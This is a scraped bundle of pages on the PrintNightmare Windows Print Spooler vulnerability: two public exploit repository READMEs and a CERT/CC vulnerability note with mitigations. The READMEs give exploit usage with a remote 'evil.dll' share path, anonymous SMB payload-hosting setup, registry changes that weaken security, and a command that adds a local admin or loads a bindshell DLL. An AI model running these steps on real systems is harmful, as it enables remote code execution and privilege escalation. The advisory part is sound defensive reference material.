=== Content from msrc.microsoft.com_653eaee0_20250108_154939.html ===
You need to enable JavaScript to run this app.

=== Content from github.com_3a054489_20250108_154939.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcube0x0%2FCVE-2021-1675)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcube0x0%2FCVE-2021-1675)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=cube0x0%2FCVE-2021-1675)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cube0x0](/cube0x0)
/
**[CVE-2021-1675](/cube0x0/CVE-2021-1675)**
Public

* [Notifications](/login?return_to=%2Fcube0x0%2FCVE-2021-1675) You must be signed in to change notification settings
* [Fork
  584](/login?return_to=%2Fcube0x0%2FCVE-2021-1675)
* [Star
   1.9k](/login?return_to=%2Fcube0x0%2FCVE-2021-1675)

C# and Impacket implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527

[1.9k
stars](/cube0x0/CVE-2021-1675/stargazers) [584
forks](/cube0x0/CVE-2021-1675/forks) [Branches](/cube0x0/CVE-2021-1675/branches) [Tags](/cube0x0/CVE-2021-1675/tags) [Activity](/cube0x0/CVE-2021-1675/activity)
 [Star](/login?return_to=%2Fcube0x0%2FCVE-2021-1675)

 [Notifications](/login?return_to=%2Fcube0x0%2FCVE-2021-1675) You must be signed in to change notification settings

* [Code](/cube0x0/CVE-2021-1675)
* [Issues
  36](/cube0x0/CVE-2021-1675/issues)
* [Pull requests
  2](/cube0x0/CVE-2021-1675/pulls)
* [Actions](/cube0x0/CVE-2021-1675/actions)
* [Projects
  0](/cube0x0/CVE-2021-1675/projects)
* [Security](/cube0x0/CVE-2021-1675/security)
* [Insights](/cube0x0/CVE-2021-1675/pulse)

Additional navigation options

* [Code](/cube0x0/CVE-2021-1675)
* [Issues](/cube0x0/CVE-2021-1675/issues)
* [Pull requests](/cube0x0/CVE-2021-1675/pulls)
* [Actions](/cube0x0/CVE-2021-1675/actions)
* [Projects](/cube0x0/CVE-2021-1675/projects)
* [Security](/cube0x0/CVE-2021-1675/security)
* [Insights](/cube0x0/CVE-2021-1675/pulse)

# cube0x0/CVE-2021-1675

    main[Branches](/cube0x0/CVE-2021-1675/branches)[Tags](/cube0x0/CVE-2021-1675/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[26 Commits](/cube0x0/CVE-2021-1675/commits/main/) | | |
| [Images](/cube0x0/CVE-2021-1675/tree/main/Images "Images") | | [Images](/cube0x0/CVE-2021-1675/tree/main/Images "Images") |  |  |
| [SharpPrintNightmare](/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare "SharpPrintNightmare") | | [SharpPrintNightmare](/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare "SharpPrintNightmare") |  |  |
| [CVE-2021-1675.py](/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py "CVE-2021-1675.py") | | [CVE-2021-1675.py](/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py "CVE-2021-1675.py") |  |  |
| [README.md](/cube0x0/CVE-2021-1675/blob/main/README.md "README.md") | | [README.md](/cube0x0/CVE-2021-1675/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2021-1675 / CVE-2021-34527

Impacket implementation of the [PrintNightmare](https://github.com/afwu/PrintNightmare)  PoC originally created by Zhiniang Peng (@edwardzpeng) & Xuefeng Li (@lxf02942370)

Tested on a fully patched 2019 Domain Controller

Execute malicious DLL's remote or locally

[![](/cube0x0/CVE-2021-1675/raw/main/Images/poc2.png)](/cube0x0/CVE-2021-1675/blob/main/Images/poc2.png)

### Patch update

Microsoft has released a patch to mitigate against these attacks but if these values below are present on a machine, then the machine will still be vulnerable

```
REG QUERY "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint
    RestrictDriverInstallationToAdministrators    REG_DWORD    0x0
    NoWarningNoElevationOnInstall    REG_DWORD    0x1

```

### Installation

Before running the exploit you need to install my version of Impacket and after that you're gucci

```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install

```

### CVE-2021-1675.py

```
usage: CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share

CVE-2021-1675 implementation.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  share                 Path to DLL. Example '\\10.10.10.10\share\evil.dll'

optional arguments:
  -h, --help            show this help message and exit

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

connection:
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name
                        and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server

Example;
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'

```

### SMB configuration

Easiest way to host payloads is to use samba and modify `/etc/samba/smb.conf`  to allow anonymous access

```
[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445

[smb]
    comment = Samba
    path = /tmp/
    guest ok = yes
    read only = no
    browsable = yes
    force user = smbuser

```

From windows it's also possible

```
mkdir C:\share
icacls C:\share\ /T /grant Anonymous` logon:r
icacls C:\share\ /T /grant Everyone:r
New-SmbShare -Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f
# Reboot

```

### Scanning

We can use `rpcdump.py` from impacket to scan for potential vulnerable hosts, if it returns a value, it could be vulnerable

```
rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
```

### Mitigation

Disable Spooler service

```
Stop-Service Spooler
REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWORD /d "4" /f
```

## About

C# and Impacket implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527

### Resources

[Readme](#readme-ov-file)

[Activity](/cube0x0/CVE-2021-1675/activity)
### Stars

[**1.9k**
stars](/cube0x0/CVE-2021-1675/stargazers)
### Watchers

[**43**
watching](/cube0x0/CVE-2021-1675/watchers)
### Forks

[**584**
forks](/cube0x0/CVE-2021-1675/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fcube0x0%2FCVE-2021-1675&report=cube0x0+%28user%29)

## [Releases](/cube0x0/CVE-2021-1675/releases)

No releases published

## [Packages 0](/users/cube0x0/packages?repo_name=CVE-2021-1675)

No packages published

## Languages

* [C#
  50.8%](/cube0x0/CVE-2021-1675/search?l=c%23)
* [Python
  49.2%](/cube0x0/CVE-2021-1675/search?l=python)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from packetstormsecurity.com_9a214353_20250108_130449.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from msrc.microsoft.com_d6acd85d_20250108_154937.html ===
You need to enable JavaScript to run this app.

=== Content from github.com_a740c7de_20250108_154938.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcalebstewart%2FCVE-2021-1675)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcalebstewart%2FCVE-2021-1675)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=calebstewart%2FCVE-2021-1675)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[calebstewart](/calebstewart)
/
**[CVE-2021-1675](/calebstewart/CVE-2021-1675)**
Public

* [Notifications](/login?return_to=%2Fcalebstewart%2FCVE-2021-1675) You must be signed in to change notification settings
* [Fork
  231](/login?return_to=%2Fcalebstewart%2FCVE-2021-1675)
* [Star
   1k](/login?return_to=%2Fcalebstewart%2FCVE-2021-1675)

Pure PowerShell implementation of CVE-2021-1675 Print Spooler Local Privilege Escalation (PrintNightmare)

[1k
stars](/calebstewart/CVE-2021-1675/stargazers) [231
forks](/calebstewart/CVE-2021-1675/forks) [Branches](/calebstewart/CVE-2021-1675/branches) [Tags](/calebstewart/CVE-2021-1675/tags) [Activity](/calebstewart/CVE-2021-1675/activity)
 [Star](/login?return_to=%2Fcalebstewart%2FCVE-2021-1675)

 [Notifications](/login?return_to=%2Fcalebstewart%2FCVE-2021-1675) You must be signed in to change notification settings

* [Code](/calebstewart/CVE-2021-1675)
* [Issues
  6](/calebstewart/CVE-2021-1675/issues)
* [Pull requests
  1](/calebstewart/CVE-2021-1675/pulls)
* [Actions](/calebstewart/CVE-2021-1675/actions)
* [Projects
  0](/calebstewart/CVE-2021-1675/projects)
* [Security](/calebstewart/CVE-2021-1675/security)
* [Insights](/calebstewart/CVE-2021-1675/pulse)

Additional navigation options

* [Code](/calebstewart/CVE-2021-1675)
* [Issues](/calebstewart/CVE-2021-1675/issues)
* [Pull requests](/calebstewart/CVE-2021-1675/pulls)
* [Actions](/calebstewart/CVE-2021-1675/actions)
* [Projects](/calebstewart/CVE-2021-1675/projects)
* [Security](/calebstewart/CVE-2021-1675/security)
* [Insights](/calebstewart/CVE-2021-1675/pulse)

# calebstewart/CVE-2021-1675

    main[Branches](/calebstewart/CVE-2021-1675/branches)[Tags](/calebstewart/CVE-2021-1675/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[11 Commits](/calebstewart/CVE-2021-1675/commits/main/) | | |
| [nightmare-dll](/calebstewart/CVE-2021-1675/tree/main/nightmare-dll "nightmare-dll") | | [nightmare-dll](/calebstewart/CVE-2021-1675/tree/main/nightmare-dll "nightmare-dll") |  |  |
| [CVE-2021-1675.ps1](/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1 "CVE-2021-1675.ps1") | | [CVE-2021-1675.ps1](/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1 "CVE-2021-1675.ps1") |  |  |
| [README.md](/calebstewart/CVE-2021-1675/blob/main/README.md "README.md") | | [README.md](/calebstewart/CVE-2021-1675/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2021-1675 - PrintNightmare LPE (PowerShell)

> Caleb Stewart | John Hammond | July 1, 2021

---

[CVE-2021-1675](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675) is a critical remote code execution and local privilege escalation vulnerability dubbed "PrintNightmare."

Proof-of-concept exploits have been released ([Python](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py), [C++](https://github.com/afwu/PrintNightmare/blob/main/EXP/POC/POC.cpp)) for the remote code execution capability, and a [C# rendition](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare) for local privilege escalation. We had not seen a native implementation in pure PowerShell, and we wanted to try our hand at refining and recrafting the exploit.

This PowerShell script performs local privilege escalation (LPE) with the PrintNightmare attack technique.

[![image](https://user-images.githubusercontent.com/6288722/124203761-70b36580-daab-11eb-8520-7d93743062af.png)](https://user-images.githubusercontent.com/6288722/124203761-70b36580-daab-11eb-8520-7d93743062af.png)

This has been tested on Windows Server 2016 and Windows Server 2019.

## Usage

Add a new user to the local administrators group by default:

```
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default

Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure"
```

Supply a custom DLL payload, to do anything else you might like.

```
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
```

## Details

* The LPE technique does not need to work with remote RPC or SMB, as it is only working with the functions of Print Spooler.
* This script embeds a Base64-encoded GZIPped payload for a custom DLL, that is patched according to your arguments, to easily add a new user to the local administrators group.
* This script embeds methods from PowerSploit/[PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) to reflectively access the Win32 APIs.
* This method does not loop through all printer drivers to find the appropriate DLL path -- it simply grabs the first driver and determines the appropriate path.

## About

Pure PowerShell implementation of CVE-2021-1675 Print Spooler Local Privilege Escalation (PrintNightmare)

### Resources

[Readme](#readme-ov-file)

[Activity](/calebstewart/CVE-2021-1675/activity)
### Stars

[**1k**
stars](/calebstewart/CVE-2021-1675/stargazers)
### Watchers

[**26**
watching](/calebstewart/CVE-2021-1675/watchers)
### Forks

[**231**
forks](/calebstewart/CVE-2021-1675/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fcalebstewart%2FCVE-2021-1675&report=calebstewart+%28user%29)

## [Releases](/calebstewart/CVE-2021-1675/releases)

No releases published

## [Packages 0](/users/calebstewart/packages?repo_name=CVE-2021-1675)

No packages published

## [Contributors 2](/calebstewart/CVE-2021-1675/graphs/contributors)

* [![@JohnHammond](https://avatars.githubusercontent.com/u/6288722?s=64&v=4)](https://github.com/JohnHammond)
  [**JohnHammond**
  John Hammond](https://github.com/JohnHammond)
* [![@calebstewart](https://avatars.githubusercontent.com/u/7529189?s=64&v=4)](https://github.com/calebstewart)
  [**calebstewart**
  Caleb Stewart](https://github.com/calebstewart)

## Languages

* [PowerShell
  99.0%](/calebstewart/CVE-2021-1675/search?l=powershell)
* Other
  1.0%

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from msrc.microsoft.com_dacfb661_20250108_154939.html ===
You need to enable JavaScript to run this app.

=== Content from www.kb.cert.org_fa1e4f2d_20250108_130451.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#383432

## Microsoft Windows Print Spooler allows for RCE via AddPrinterDriverEx()

#### Vulnerability Note VU#383432

Original Release Date: 2021-06-30 | Last Revised: 2021-08-03

---

### Overview

The Microsoft Windows Print Spooler service fails to restrict access to functionality that allows users to add printers and related drivers, which can allow a remote authenticated attacker to execute arbitrary code with SYSTEM privileges on a vulnerable system.

### Description

The [RpcAddPrinterDriverEx()](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b) function is used to install a printer driver on a system. One of the parameters to this function is the [DRIVER\_CONTAINER](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/353ff796-6fb3-41cf-8b35-0022dd53d886) object, which contains information about which driver is to be used by the added printer. The other argument, `dwFileCopyFlags`, specifies how replacement printer driver files are to be copied. An attacker can take advantage of the fact that any authenticated user can call `RpcAddPrinterDriverEx()` and specify a driver file that lives on a remote server. This results in the Print Spooler service `spoolsv.exe` executing code in an arbitrary DLL file with SYSTEM privileges.

Note that while original exploit code relied on the `RpcAddPrinterDriverEx` to achieve code execution, [an updated version of the exploit](https://github.com/cube0x0/CVE-2021-1675) uses [RpcAsyncAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/5d864e3e-5d8b-4337-89ce-cb0258ab97cd) to achieve the same goal. Both of these functions achieve their functionality using [AddPrinterDriverEx](https://docs.microsoft.com/en-us/windows/win32/printdocs/addprinterdriverex).

While Microsoft has released an [update for CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675), it is important to realize that this update does **NOT** protect against public exploits that may refer to `PrintNightmare` or CVE-2021-1675.

On July 1, Microsoft released [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527). This bulletin states that CVE-2021-34527 is similar but distinct from the vulnerability that is assigned CVE-2021-1675, which addresses a different vulnerability in RpcAddPrinterDriverEx(). The attack vector is different as well. CVE-2021-1675 was addressed by the June 2021 security update.

### Impact

By sending a request to add a printer, e.g. by using `RpcAddPrinterDriverEx()` over SMB or `RpcAsyncAddPrinterDriver()` over RPC, a remote, authenticated attacker may be able to execute arbitrary code with SYSTEM privileges on a vulnerable system. A local unprivileged user may be able to execute arbitrary code with SYSTEM privileges as well. We have created a flowchart to indicate exploitability of PrintNightmare across various platform configurations:

[![PrintNightmare exploitability flowchart](/static-bigvince-prod-kb-eb/383432_PrintNightmare%20Flowchart-v9.png)](/static-bigvince-prod-kb-eb/383432_PrintNightmare%20Flowchart-v9.png)

### Solution

#### Apply an update

Microsoft has addressed this issue in the [updates for CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527). Note that the Microsoft update for CVE-2021-34527 does not effectively prevent exploitation of systems where the [Point and Print](https://docs.microsoft.com/en-us/windows-hardware/drivers/print/introduction-to-point-and-print) `NoWarningNoElevationOnInstall` is set to a non-`0` value. Microsoft indicates that systems that have `NoWarningNoElevationOnInstall` is set to a non-`0` value are **vulnerable by design.** For systems that do not have the CVE-2021-34527 installed, or have Point and Print configured insecurely, please consider the following workarounds:

#### Apply a workaround

Microsoft has listed several workarounds in their [advisory for CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527). Specifically:

#### Microsoft Option 1 - Stop and disable the Print Spooler service

This vulnerability can be mitigated by stopping and disabling the Print Spooler service in Windows.

If disabling the Print Spooler service is appropriate for your enterprise, use the following PowerShell commands:

`Stop-Service -Name Spooler -Force`

`Set-Service -Name Spooler -StartupType Disabled`

**Impact of workaround** Disabling the Print Spooler service disables the ability to print both locally and remotely.

#### Microsoft Option 2 - Disable inbound remote printing through Group Policy

Disable the âAllow Print Spooler to accept client connections:â policy to block remote attacks.

**Impact of workaround** This policy will block the remote attack vector by preventing inbound remote printing operations. The system will no longer function as a print server, but local printing to a directly attached device will still be possible.

**Note:** The Print Spooler service **must** be restarted for this workaround to be activated.

#### Block RPC and SMB ports at the firewall

Limited testing has shown that blocking both the RPC Endpoint Mapper (`135/tcp`) and SMB (`139/tcp` and `445/tcp`) incoming traffic at a host-based firewall level can prevent remote exploitation of this vulnerability. Note that blocking these ports on a Windows system may prevent expected capabilities from functioning properly, especially on a system that functions as a server.

#### Enable security prompts for Point and Print

Ensure that the Windows Point and Print Restrictions are set to `Show warning and elevation prompt` for both installing and updating drivers in the Windows Group Policy. Specifically the `HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint\` key should have `NoWarningNoElevationOnInstall` and `UpdatePromptSettings` entries that are both set to `0`.

#### Restrict printer driver installation ability to administrators

After the Microsoft update for CVE-2021-34527 is installed, a registry value called `RestrictDriverInstallationToAdministrators` in the `HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint\` key is checked, which is intended to restrict printer driver installation to only administrator users. Please see [KB5005010](https://support.microsoft.com/en-us/topic/kb5005010-restricting-installation-of-new-printer-drivers-after-applying-the-july-6-2021-updates-31b91c02-05bc-4ada-a7ea-183b129578a7) for more details.

### Acknowledgements

This issue was publicly disclosed by Zhiniang Peng and Xuefeng Li.

This document was written by Will Dormann.

### Vendor Information

383432
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

### [Microsoft](#Microsoft) Affected

Notified:  2021-06-30
Updated: 2021-07-08

| **CVE-2021-1675** | Affected |
| --- | --- |
| **CVE-2021-34527** | Affected |

#### Vendor Statement

We have not received a statement from the vendor.

#### References

* <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527>

### References

* <https://msrc-blog.microsoft.com/2021/07/08/clarified-guidance-for-cve-2021-34527-windows-print-spooler-vulnerability/>
* <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675>
* <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527>
* <https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b>
* <https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/353ff796-6fb3-41cf-8b35-0022dd53d886>
* <https://docs.microsoft.com/en-us/windows-hardware/drivers/print/introduction-to-point-and-print>
* <https://docs.microsoft.com/en-us/windows/win32/printdocs/addprinterdriverex>
* <https://support.microsoft.com/en-us/topic/kb5005010-restricting-installation-of-new-printer-drivers-after-applying-the-july-6-2021-updates-31b91c02-05bc-4ada-a7ea-183b129578a7>
* <https://github.com/afwu/PrintNightmare>
* <https://github.com/cube0x0/CVE-2021-1675>
* <https://github.com/calebstewart/CVE-2021-1675>

### Other Information

| **CVE IDs:** | [CVE-2021-1675](http://web.nvd.nist.gov/vuln/detail/CVE-2021-1675)  [CVE-2021-34527](http://web.nvd.nist.gov/vuln/detail/CVE-2021-34527) |
| --- | --- |
| **Date Public:** | 2021-06-30 |
| **Date First Published:** | 2021-06-30 |
| **Date Last Updated:** | 2021-08-03 15:36 UTC |
| **Document Revision:** | 32 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

